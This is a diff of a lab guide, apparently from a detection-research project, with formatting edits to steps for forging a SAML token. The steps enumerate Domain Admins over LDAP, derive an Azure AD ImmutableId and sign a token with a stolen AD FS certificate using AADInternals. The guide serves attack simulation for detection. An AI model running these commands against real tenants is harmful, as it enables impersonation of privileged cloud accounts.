@@ -7,7 +7,8 @@ If a threat actor gets to steal the AD FS token signing certificate from an AD F
 2.	Forge SAML tokens.
 
 ## Enumerate Privileged Accounts
-Let’s start by identifying privileged accounts that we could impersonate and that could also have privileged access to resources in the cloud. In this lab guide, the default domain admin account named pgustavo was also the account that was assigned the Azure AD built-in Global Administrator role. Therefore, we can start by enumerating the members of the `Domain Admins` group.
+Let's start by identifying privileged accounts that we could impersonate and that could also have privileged access to resources in the cloud. In this lab guide, the default domain admin account named `pgustavo` was also the account that was assigned the Azure AD built-in Global Administrator role. Therefore, we can start by enumerating the members of the `Domain Admins` group.
+
 There are several ways and protocols to accomplish this. However, for the purpose of this basic step, we are going to use LDAP search queries.
 
 ### Lightweight Directory Access Protocol (LDAP)
@@ -20,7 +21,8 @@ There are several ways and protocols to accomplish this. However, for the purpos
     * Port open: 389
 
 **Enumerate Members of the Domain Admins Group**
-Start PowerShell as administrator and run the following commands.
+
+Start PowerShell as administrator and run the following commands:
 
 ```PowerShell
 # Get Domain Name
@@ -31,8 +33,8 @@ $DNDomain = [string]::Join(",", ($arr | % { "DC={0}" -f $_ }))
 # Create LDAP Search
 $ADSearch = New-Object System.DirectoryServices.DirectorySearcher
 $ADSearch.SearchRoot = "LDAP://$DomainName/$DNDomain"
-$ADSearch.Filter=" (&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,$DNDomain))"
-$ADUsers=$ADSearch.FindAll()
+$ADSearch.Filter = "(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,$DNDomain))"
+$ADUsers = $ADSearch.FindAll()
 $Results = @()
 
 # Process Results
@@ -53,14 +55,13 @@ $Results | Format-Table Samaccountname,ObjectGuid
 
 ## Forge SAML Token
 Once again, a threat actor would most likely do this outside of the compromised organization. 
-In the previous steps from the [Local Export AD FS Token Signing Certificate](localExportADFSTokenSigningCertificate.md) document, the certificate was exported to the `C:\ProgramData` directory with the name `ADFSTokenSigningCertificate.pfx`.
- 
+In the last steps from the previous document ([Local Export AD FS Token Signing Certificate](localExportADFSTokenSigningCertificate.md)), the certificate was exported to the `C:\ProgramData` directory with the name `ADFSTokenSigningCertificate.pfx`.
 
-## Convert User AD Object GUID to its Azure AD Immutable ID representation
-Once we identify the privileged user we want to impersonate, we need to obtain the immutable id of the account AD object GUID. The ImmutableId is the base64-encoded representation of a domain user GUID in Azure AD.
+### Convert User AD Object GUID to its Azure AD Immutable ID representation
+Once we identify the privileged user we want to impersonate, we need to obtain the immutable ID of the account AD object GUID. The `ImmutableId` is the base64-encoded representation of a domain user GUID in Azure AD.
 
 ```PowerShell
-$ObjectGUID = “07cd318c-b6ba-432e-9936-b992d7c78388”
+$ObjectGUID = "07cd318c-b6ba-432e-9936-b992d7c78388"
 $ImmutableId = [convert]::ToBase64String(([guid]$ObjectGUID).ToByteArray())
 ```
 
@@ -68,7 +69,7 @@ $ImmutableId = [convert]::ToBase64String(([guid]$ObjectGUID).ToByteArray())
 
 We are now ready to forge a SAML token for the privileged user.
 
-## Sign a New SAML Token via AADInternals
+### Sign a New SAML Token via AADInternals
 If you have not installed AADInternals yet, open PowerShell as administrator and run the following:
 
 ```PowerShell
@@ -78,13 +79,13 @@ Import-Module –Name AADInternals
 
 ![](../../resources/images/simulate_detect/credential-access/signSAMLToken/2021-05-19_03_install_aadinternals.png)
 
-Use the `New-AADIntSAMLToken` function to sign a new SAML token. We would need to pass the “ImmutableID”, the path to the token signing certificate and the issuer as parameters.
+Use the `New-AADIntSAMLToken` function to sign a new SAML token. We would need to pass the `ImmutableID`, the path to the token signing certificate and the issuer as parameters.
 
 ```PowerShell 
 $ImmutableId = 'jDHNB7q2LkOZNrmS18eDiA=='
 $Cert = 'C:\ProgramData\ADFSTokenSigningCertificate.pfx'
 $Issuer = 'http://simulandlabs.com/adfs/services/trust/'
-$SamlToken=New-AADIntSAMLToken -ImmutableID $ImmutableId -PfxFileName $Cert -PfxPassword "" -Issuer $Issuer
+$SamlToken = New-AADIntSAMLToken -ImmutableID $ImmutableId -PfxFileName $Cert -PfxPassword "" -Issuer $Issuer
 ```
 
 ![](../../resources/images/simulate_detect/credential-access/signSAMLToken/2021-05-19_04_sign_saml_token.png)
